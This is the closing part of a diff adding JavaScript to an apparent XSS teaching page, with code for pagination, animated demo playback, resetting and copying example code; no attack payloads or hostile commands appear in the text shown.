+            pageInfo.textContent = `第 ${currentPage} 页 / 共 ${totalPages || 1} 页`;
+            
+            prevBtn.disabled = currentPage <= 1;
+            nextBtn.disabled = currentPage >= totalPages || totalPages === 0;
+        }
+
+        // 切换页面
+        function changePage(direction) {
+            const allDemos = document.querySelectorAll('.demo-card');
+            let visibleCount = 0;
+            
+            allDemos.forEach(demo => {
+                const category = demo.dataset.category;
+                if (currentFilter === 'all' || category === currentFilter) {
+                    visibleCount++;
+                }
+            });
+            
+            const totalPages = Math.ceil(visibleCount / itemsPerPage);
+            
+            currentPage += direction;
+            if (currentPage < 1) currentPage = 1;
+            if (currentPage > totalPages) currentPage = totalPages;
+            
+            updateDisplay();
+        }
+
+        // 运行动画演示
+        function runDemo(demoId) {
+            const demo = demos[demoId];
+            const contentEl = document.getElementById(`demo${demoId}-content`);
+            const inputEl = document.getElementById(`demo${demoId}-input`);
+            const scriptEl = document.getElementById(`demo${demoId}-script`);
+            
+            // 重置状态
+            resetDemo(demoId);
+            
+            // 动画序列
+            setTimeout(() => {
+                if (inputEl) {
+                    inputEl.style.opacity = '1';
+                    inputEl.style.left = '50%';
+                    inputEl.style.top = '20%';
+                    inputEl.style.transform = 'translateX(-50%)';
+                    inputEl.classList.add('floating');
+                }
+                if (scriptEl) {
+                    scriptEl.style.opacity = '1';
+                    scriptEl.style.right = '10%';
+                    scriptEl.style.top = '30%';
+                }
+            }, 500);
+            
+            setTimeout(() => {
+                if (contentEl) {
+                    contentEl.innerHTML = demo.result;
+                    contentEl.style.color = '#e53e3e';
+                    contentEl.style.fontWeight = 'bold';
+                }
+            }, 1500);
+            
+            setTimeout(() => {
+                if (inputEl) inputEl.style.opacity = '0';
+                if (scriptEl) scriptEl.style.opacity = '0';
+            }, 3000);
+        }
+
+        // 重置演示
+        function resetDemo(demoId) {
+            const demo = demos[demoId];
+            const contentEl = document.getElementById(`demo${demoId}-content`);
+            const inputEl = document.getElementById(`demo${demoId}-input`);
+            const scriptEl = document.getElementById(`demo${demoId}-script`);
+            
+            if (contentEl) {
+                contentEl.innerHTML = demo.content;
+                contentEl.style.color = '';
+                contentEl.style.fontWeight = '';
+            }
+            if (inputEl) {
+                inputEl.style.opacity = '0';
+                inputEl.classList.remove('floating');
+            }
+            if (scriptEl) {
+                scriptEl.style.opacity = '0';
+            }
+        }
+
+        // 复制代码
+        function copyCode(button) {
+            const codeDisplay = button.closest('.code-display');
+            const codeText = codeDisplay.textContent.replace('复制', '').trim();
+            
+            navigator.clipboard.writeText(codeText).then(() => {
+                const originalText = button.textContent;
+                button.textContent = '已复制!';
+                setTimeout(() => {
+                    button.textContent = originalText;
+                }, 2000);
+            });
+        }
+
+        // 页面加载完成后初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            updateDisplay();
+            console.log('XSS演示平台已加载');
+        });
+    </script>
+</body>
+</html>
